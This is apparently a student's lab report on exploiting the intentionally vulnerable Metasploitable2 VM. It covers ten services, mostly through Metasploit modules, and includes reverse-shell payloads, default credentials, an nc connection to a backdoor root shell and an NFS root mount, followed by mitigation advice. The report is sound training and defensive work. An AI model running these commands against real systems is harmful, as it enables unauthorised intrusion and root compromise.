# Metasploitable2 Exploitation Report

**Name:** Asante Oteng Kwabena
**Index Number:** 7353523
**Date:** 2026-09-28
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux 2026.2, Metasploit Framework, msfconsole

\---

## Reconnaissance Summary

Target services were identified through banner grabs and module `check`/`run` output surfaced during exploitation (e.g. vsftpd 220 banner, PostgreSQL version string, NFS export list). Attacker host: 192.168.1.4. Target host: 192.168.1.3.

\---

## Exploit 1: vsftpd 2.3.4 Backdoor

* **Service / Port:** FTP / 21
* **Vulnerability:** Malicious backdoor planted in vsftpd 2.3.4 source (triggered by a `:)` smiley in the username)
* **Tool Used:** Metasploit — `exploit/unix/ftp/vsftpd\_234\_backdoor`
* **Why This Tool:** Metasploit's module automates the exact byte sequence needed to trigger the backdoor listener on port 6200 and wraps the resulting shell into a handler session, which is faster and more reliable than manually crafting the trigger string over raw FTP.
* **Steps:**

  1. `search vsftpd`
  2. `use exploit/unix/ftp/vsftpd\_234\_backdoor`
  3. `set RHOSTS 192.168.1.3`
  4. `set LHOST 192.168.1.4`
  5. `run`
  6. `meterpreter > getuid`
* **Evidence:** evidence/exploit\_1.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Installation, Actions on Objectives

  * Reconnaissance: the FTP banner (220 vsFTPd 2.3.4) was observed to confirm the vulnerable version.
  * Exploitation: the module sent the trigger sequence to open a backdoor listener on the target.
  * Installation: the backdoor shell was caught and upgraded into a Meterpreter session.
  * Actions on Objectives: `getuid` confirmed root access was obtained.
* **Outcome / Impact:** Root-level Meterpreter session (uid=0/root) on the target with no authentication required.

\---

## Exploit 2: Anonymous FTP Access

* **Service / Port:** FTP / 21
* **Vulnerability:** FTP server configured to allow anonymous login with no credentials
* **Tool Used:** Native `ftp` client (invoked via `msf > ftp 192.168.1.3`)
* **Why This Tool:** No exploit module is needed for a misconfiguration like anonymous login — the standard FTP client is sufficient to demonstrate and use the exposure directly.
* **Steps:**

  1. `ftp 192.168.1.3`
  2. Login as `anonymous` with blank/arbitrary password
  3. `ls -la` to list directory contents
* **Evidence:** evidence/exploit\_2.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation

  * Reconnaissance: directory listing reveals filesystem structure accessible to anonymous users.
  * Exploitation: the misconfiguration (anonymous login enabled) was directly leveraged to gain unauthenticated access.
* **Outcome / Impact:** Unauthenticated read access to the FTP root directory, confirming a second, independent weakness in the same service.

\---

## Exploit 3: UnrealIRCd 3.2.8.1 Backdoor (Attempted)

* **Service / Port:** IRC / 6667
* **Vulnerability:** Backdoored UnrealIRCd 3.2.8.1 source distribution allowing arbitrary command execution via a crafted IRC message
* **Tool Used:** Metasploit — `exploit/unix/irc/unreal\_ircd\_3281\_backdoor`
* **Why This Tool:** This module is purpose-built to detect the backdoored UnrealIRCd build and send the magic trigger bytes over an IRC connection, which the check output confirmed ("UnrealIRCd detected via IRC commands").
* **Steps:**

  1. `search unreal`
  2. `use exploit/unix/irc/unreal\_ircd\_3281\_backdoor`
  3. `set RHOSTS 192.168.1.3`
  4. `set LHOST 192.168.1.4`
  5. `run` (initial attempt — completed but no session)
  6. `set PAYLOAD cmd/unix/reverse`
  7. `set ExitOnSession false`
  8. `run` again
* **Evidence:** evidence/exploit\_3.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery

  * Reconnaissance: the module confirmed the target as vulnerable via IRC command detection.
  * Weaponization: the backdoor command was staged and sent.
  * Delivery: the trigger was delivered over the IRC connection, though no session was ultimately created in this run.
* **Outcome / Impact:** Vulnerability confirmed and backdoor command delivered; no interactive session was established in the captured run.

\---

## Exploit 4: Samba "username map script" Command Execution

* **Service / Port:** Samba / 139-445
* **Vulnerability:** Samba 3.0.20 `username map script` option allows shell metacharacter injection via the login username (CVE-2007-2447)
* **Tool Used:** Metasploit — `exploit/multi/samba/usermap\_script`
* **Why This Tool:** The module automates crafting a username containing shell metacharacters to reach the vulnerable `username map script` code path, which is far more reliable than manually scripting an SMB login with injected characters.
* **Steps:**

  1. `use exploit/multi/samba/usermap\_script`
  2. `set RHOSTS 192.168.1.3`
  3. `set LHOST 192.168.1.4`
  4. `set PAYLOAD cmd/unix/reverse\_netcat`
  5. `run`
  6. `whoami` / `id` in the resulting shell
* **Evidence:** evidence/exploit\_4.png
* **Cyber Kill Chain Stage(s):** Exploitation, Installation, Actions on Objectives

  * Exploitation: the crafted username triggered command execution in the Samba service.
  * Installation: a reverse netcat shell was established back to the attacker.
  * Actions on Objectives: `id` confirmed root privileges in the resulting shell.
* **Outcome / Impact:** Command shell session with uid=0(root) gid=0(root).

\---

## Exploit 5: Ingreslock Backdoor (Port 1524)

* **Service / Port:** 1524/tcp
* **Vulnerability:** A pre-planted root shell listener left open on the common "ingreslock" backdoor port on Metasploitable2
* **Tool Used:** `nc` (netcat), invoked via `msf > nc 192.168.1.3 1524`
* **Why This Tool:** The backdoor is simply a raw root shell bound to a TCP port with no protocol handshake required, so a plain netcat connection is the correct and simplest tool rather than a Metasploit exploit module.
* **Steps:**

  1. `nc 192.168.1.3 1524`
  2. `whoami`
  3. `id`
  4. `exit`
* **Evidence:** evidence/exploit\_5.png
* **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives

  * Exploitation: connecting to the open backdoor port immediately yielded an interactive shell with no authentication.
  * Actions on Objectives: `id` confirmed uid=0(root) gid=0(root) groups=0(root).
* **Outcome / Impact:** Instant, unauthenticated root shell access via a pre-existing backdoor listener.

\---

## Exploit 6: Apache Tomcat Manager Authenticated Upload (Attempted)

* **Service / Port:** HTTP / 8180
* **Vulnerability:** Tomcat Manager application accepts WAR file uploads from authenticated users with manager role, allowing arbitrary code execution
* **Tool Used:** Metasploit — `exploit/multi/http/tomcat\_mgr\_upload`
* **Why This Tool:** The module automates authenticating to the Manager interface, packaging a malicious WAR payload, and deploying/triggering it — a multi-step HTTP workflow that would be tedious and error-prone to replicate manually.
* **Steps:**

  1. `search tomcat\_mgr\_upload`
  2. `use exploit/multi/http/tomcat\_mgr\_upload`
  3. `set RHOSTS 192.168.1.3`
  4. `set RPORT 8180`
  5. `set HttpUsername tomcat`
  6. `set HttpPassword tomcat`
  7. `set LHOST 192.168.1.4`
  8. `run`
* **Evidence:** evidence/exploit\_6.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery

  * Reconnaissance: default credentials (tomcat/tomcat) were used based on known default configuration.
  * Weaponization: a WAR payload was generated and packaged for deployment.
  * Delivery: the payload was uploaded and deployed/undeployed on the Manager app, though the exploit completed without a session being created in this run.
* **Outcome / Impact:** Confirmed default-credential access to Tomcat Manager and successful payload deployment path; no session captured in this attempt.

\---

## Exploit 7: PostgreSQL Payload Execution

* **Service / Port:** PostgreSQL / 5432
* **Vulnerability:** PostgreSQL configured with weak/default credentials (postgres/postgres), combined with the ability to load and execute a shared library via a superuser session
* **Tool Used:** Metasploit — `exploit/linux/postgres/postgres\_payload`
* **Why This Tool:** This module automates authenticating to PostgreSQL and abusing the database's ability to load a compiled shared object as an extension to execute arbitrary code, which is the documented technique for turning DB credentials into code execution on this service.
* **Steps:**

  1. `search postgres\_payload`
  2. `use exploit/linux/postgres/postgres\_payload`
  3. `set RHOSTS 192.168.1.3`
  4. `set USERNAME postgres`
  5. `set PASSWORD postgres`
  6. `set LHOST 192.168.1.4`
  7. `run`
  8. `getuid` / `sysinfo`
* **Evidence:** evidence/exploit\_7.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Actions on Objectives

  * Reconnaissance: default PostgreSQL credentials were tried based on known defaults.
  * Weaponization: a shared-object payload was compiled/staged for upload.
  * Delivery: the `.so` payload was uploaded to `/tmp/CApNekeB.so` on the target.
  * Exploitation: the database was instructed to load the shared object, executing attacker code.
  * Installation: the payload staged into a full Meterpreter session.
  * Actions on Objectives: `getuid`/`sysinfo` confirmed the postgres service account and target OS details.
* **Outcome / Impact:** Meterpreter session running as the `postgres` service account on the Metasploitable2 Ubuntu 8.04 target.

\---

## Exploit 8: DistCC Daemon Command Execution

* **Service / Port:** DistCC / 3632
* **Vulnerability:** DistCC daemon accepts and executes compilation jobs from any client without authentication, allowing arbitrary command execution (CVE-2004-2687)
* **Tool Used:** Metasploit — `exploit/unix/misc/distcc\_exec`
* **Why This Tool:** The module encapsulates the DistCC protocol needed to submit an arbitrary command as a "compilation job," which is simpler and more reliable than hand-crafting the DistCC request format.
* **Steps:**

  1. `search distcc`
  2. `use exploit/unix/misc/distcc\_exec`
  3. `set RHOSTS 192.168.1.3`
  4. `set LHOST 192.168.1.4`
  5. `run` (first payload, cmd/unix/reverse\_bash, failed to create a session)
  6. `set PAYLOAD cmd/unix/reverse\_perl`
  7. `run`
  8. `whoami` / `id`
* **Evidence:** evidence/exploit\_8.png
* **Cyber Kill Chain Stage(s):** Exploitation, Installation, Actions on Objectives

  * Exploitation: an arbitrary shell command was submitted to the unauthenticated DistCC daemon.
  * Installation: switching to a Perl-based reverse payload successfully established a shell back to the attacker after the bash payload failed.
  * Actions on Objectives: `id` confirmed shell access as the `daemon` user.
* **Outcome / Impact:** Command shell as uid=1(daemon) gid=1(daemon) — lower-privileged than root, but unauthenticated remote code execution on the service.

\---

## Exploit 9: NFS Misconfigured Export

* **Service / Port:** NFS / 2049 (and portmapper/rpcbind)
* **Vulnerability:** NFS export of the root filesystem (`/`) to any client (`\*`) with no access restriction
* **Tool Used:** `showmount` and the native `mount` client
* **Why This Tool:** This is a configuration flaw rather than a code vulnerability, so standard NFS client utilities are the correct and sufficient tools to enumerate exports and mount the share directly.
* **Steps:**

  1. `showmount -e 192.168.1.3`
  2. `sudo mkdir -p /mnt/nfs`
  3. `sudo mount -t nfs 192.168.1.3:/ /mnt/nfs`
  4. `ls -la /mnt/nfs`
  5. `sudo umount /mnt/nfs`
* **Evidence:** evidence/exploit\_9.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives

  * Reconnaissance: `showmount -e` enumerated the exported share and confirmed it was world-exported.
  * Exploitation: the entire remote root filesystem was mounted locally with no authentication.
  * Actions on Objectives: full read (and, depending on `no\_root\_squash` settings, write) access to the target's filesystem was obtained and browsed.
* **Outcome / Impact:** Full local mount of the target's root filesystem, exposing all files including configuration and potentially sensitive data.

\---

## Exploit 10: VNC Weak/Default Authentication

* **Service / Port:** VNC / 5900
* **Vulnerability:** VNC server configured with a trivial/default password ("password")
* **Tool Used:** Metasploit — `auxiliary/scanner/vnc/vnc\_login`, followed by `vncviewer`
* **Why This Tool:** The `vnc\_login` auxiliary module automates brute-forcing/validating VNC credentials against a wordlist, and `vncviewer` is the standard client needed to actually use a discovered credential to obtain full graphical desktop access.
* **Steps:**

  1. `search vnc\_login`
  2. `use auxiliary/scanner/vnc/vnc\_login`
  3. `set RHOSTS 192.168.1.3`
  4. `run` (reports successful login with password ":password")
  5. `vncviewer 192.168.1.3` (first attempt failed authentication)
  6. `vncviewer 192.168.1.3` (second attempt succeeded, opening desktop "root's X desktop (metasploitable:0)")
* **Evidence:** evidence/exploit\_10.png, evidence/Screenshot\_10\_evidence.png
* **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives

  * Reconnaissance: the login scanner confirmed a working weak credential for the VNC service.
  * Exploitation: the discovered credential was used to authenticate to the VNC server.
  * Actions on Objectives: a full interactive graphical root desktop session was opened, giving complete control of the target.
* **Outcome / Impact:** Full graphical remote desktop access to the target as root, confirmed visually via the opened VNC viewer window.

\---

## Kill Chain Coverage Summary

|Exploit|Recon|Weaponization|Delivery|Exploitation|Installation|C2|Actions on Objectives|
|-|-|-|-|-|-|-|-|
|1. vsftpd 2.3.4 Backdoor|✔|||✔|✔||✔|
|2. Anonymous FTP Access|✔|||✔||||
|3. UnrealIRCd Backdoor|✔|✔|✔|||||
|4. Samba usermap\_script||||✔|✔||✔|
|5. Ingreslock Backdoor||||✔|||✔|
|6. Tomcat Manager Upload|✔|✔|✔|||||
|7. PostgreSQL Payload|✔|✔|✔|✔|✔||✔|
|8. DistCC Daemon Exec||||✔|✔||✔|
|9. NFS Misconfigured Export|✔|||✔|||✔|
|10. VNC Weak Auth|✔|||✔|||✔|

\---

## Lessons Learned / Mitigations

* **vsftpd 2.3.4 Backdoor:** Only install software from verified official sources/checksums; upgrade to a patched, non-backdoored vsftpd release and monitor for unexpected listeners (e.g. port 6200).
* **Anonymous FTP:** Disable anonymous FTP access entirely unless explicitly required, and if needed, restrict it to a tightly scoped, read-only, non-sensitive directory.
* **Samba usermap\_script:** Upgrade Samba past 3.0.20/3.0.25rc3 and remove/disable the `username map script` configuration option, which was deprecated specifically because of this flaw.
* **Ingreslock/backdoor listener:** Audit the system for unauthorized listening services (`netstat -tulpn`) and remove any unexplained bound ports; this is not a legitimate service and indicates prior compromise.
* **PostgreSQL:** Change default credentials, restrict `pg\_hba.conf` to trusted hosts only, and disable/restrict the ability for non-trusted roles to create and load shared-object extensions.
* **DistCC:** Never expose the DistCC daemon directly to untrusted networks; bind it to localhost or a VPN-only interface and use `--allow` host restrictions.
* **NFS:** Replace `/ \*(rw)`-style exports with specific directories exported only to specific trusted host IPs, and enable `root\_squash` to prevent remote root mapping.
* **VNC:** Enforce strong, unique VNC passwords (or disable password-only VNC in favor of SSH tunneling/key-based access), and do not expose VNC directly to untrusted networks.

